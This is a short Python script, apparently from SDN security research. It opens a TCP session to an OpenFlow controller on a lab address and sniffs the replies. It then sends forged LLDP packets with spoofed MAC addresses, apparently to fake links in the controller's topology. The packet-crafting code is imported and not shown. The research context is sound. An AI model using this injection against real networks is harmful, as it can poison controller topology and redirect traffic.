import sys
from craft_faked import *
from sniff_thread import *
from tcp_handshake import *
from openflow_session_scenario import *


if len(sys.argv)<2:
    print("Usage [interface]")
    exit()

t = TcpHandshake(("192.168.56.102",6633),sys.argv[1])
t.start()

sniffing_thread = Sniff_thread(sys.argv[1],"192.168.56.102",6633,t.sport,1000)
sniffing_thread.threaded_sniff()

analyse_scenario = Openflow_session_scenario(sniffing_thread,t)
analyse_scenario.launch_threaded()

time.sleep(5)
print("BEGINNNINNNNG!")

craft_packets = Craft_faked(t, "LLDP","0a:00:27:00:00:00","a5:23:05:00:00:01")
craft_packets.send()
craft_packets = Craft_faked(t, "LLDP","0a:00:27:00:00:00","a5:23:05:00:00:02")
craft_packets.send()

print("ENNDINNNNG!")
time.sleep(5)

analyse_scenario.end()
